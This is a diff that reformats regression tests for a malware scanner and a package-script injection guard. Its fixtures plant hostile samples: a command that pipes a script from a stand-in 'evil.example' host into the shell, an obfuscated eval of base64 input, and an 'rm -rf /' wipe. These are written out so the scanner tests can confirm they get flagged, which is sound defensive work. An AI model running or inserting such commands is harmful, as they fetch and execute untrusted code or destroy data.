@@ -24,14 +24,22 @@ function write(dir: string, rel: string, content: string): void {
 describe('MalwareScanner self-scan regression', () => {
   it('execFileAsync tool probing without net tokens stays unflagged, real net exec still flagged', async () => {
     const dir = tmpDir('zh-rg-cp-');
-    write(dir, 'probe.ts', [
-      "const { execFile } = await import('node:child_process');",
-      "const { promisify } = await import('node:util');",
-      'const execFileAsync = promisify(execFile);',
-      "const tools = ['eslint', 'semgrep', 'trivy', 'gitleaks', 'depcruise', 'jscpd'];",
-      "for (const id of tools) { await execFileAsync(id, ['--version']); }",
-    ].join('\n'));
-    write(dir, 'evil.ts', "const { exec } = require('node:child_process');\nexec('curl https://evil.example/x.sh');\n");
+    write(
+      dir,
+      'probe.ts',
+      [
+        "const { execFile } = await import('node:child_process');",
+        "const { promisify } = await import('node:util');",
+        'const execFileAsync = promisify(execFile);',
+        "const tools = ['eslint', 'semgrep', 'trivy', 'gitleaks', 'depcruise', 'jscpd'];",
+        "for (const id of tools) { await execFileAsync(id, ['--version']); }",
+      ].join('\n'),
+    );
+    write(
+      dir,
+      'evil.ts',
+      "const { exec } = require('node:child_process');\nexec('curl https://evil.example/x.sh');\n",
+    );
 
     const items = await new MalwareScanner().scan(dir);
 
@@ -59,7 +67,11 @@ describe('MalwareScanner self-scan regression', () => {
     write(dir, 'evil.js', 'eval(atob("YWxlcnQoMSk="));\n');
     write(dir, '__tests__/evil.js', 'eval(atob("YWxlcnQoMSk="));\n');
     write(dir, 'fixtures/evil.js', 'eval(atob("YWxlcnQoMSk="));\n');
-    write(dir, '__tests__/pkg/package.json', JSON.stringify({ scripts: { setup: 'curl https://evil.example/x.sh | sh' } }));
+    write(
+      dir,
+      '__tests__/pkg/package.json',
+      JSON.stringify({ scripts: { setup: 'curl https://evil.example/x.sh | sh' } }),
+    );
 
     const malware = await new MalwareScanner().scan(dir);
     const guard = await new InjectionGuard().scan(dir);
@@ -73,19 +85,24 @@ describe('MalwareScanner self-scan regression', () => {
 
 describe('InjectionGuard clean-script regression', () => {
   it('routine clean scripts are safe, destructive rm -rf still flagged', () => {
-    const verdicts = classifyPackageJsonScripts(JSON.stringify({
-      scripts: {
-        clean: 'rm -rf dist tsconfig.tsbuildinfo',
-        cleanServer: 'rm -rf dist',
-        reset: 'rm -rf ./tmp',
-        wipe: 'rm -rf /',
-      },
-    }));
+    const verdicts = classifyPackageJsonScripts(
+      JSON.stringify({
+        scripts: {
+          clean: 'rm -rf dist tsconfig.tsbuildinfo',
+          cleanServer: 'rm -rf dist',
+          reset: 'rm -rf ./tmp',
+          wipe: 'rm -rf /',
+        },
+      }),
+    );
     const by = new Map(verdicts.map((v) => [v.script, v]));
 
     expect(by.get('clean')?.verdict).toBe('safe');
     expect(by.get('cleanServer')?.verdict).toBe('safe');
-    expect(by.get('reset')).toMatchObject({ verdict: 'suspicious', matchedPattern: 'force-delete' });
+    expect(by.get('reset')).toMatchObject({
+      verdict: 'suspicious',
+      matchedPattern: 'force-delete',
+    });
     expect(by.get('wipe')).toMatchObject({ verdict: 'suspicious', matchedPattern: 'force-delete' });
   });
 });
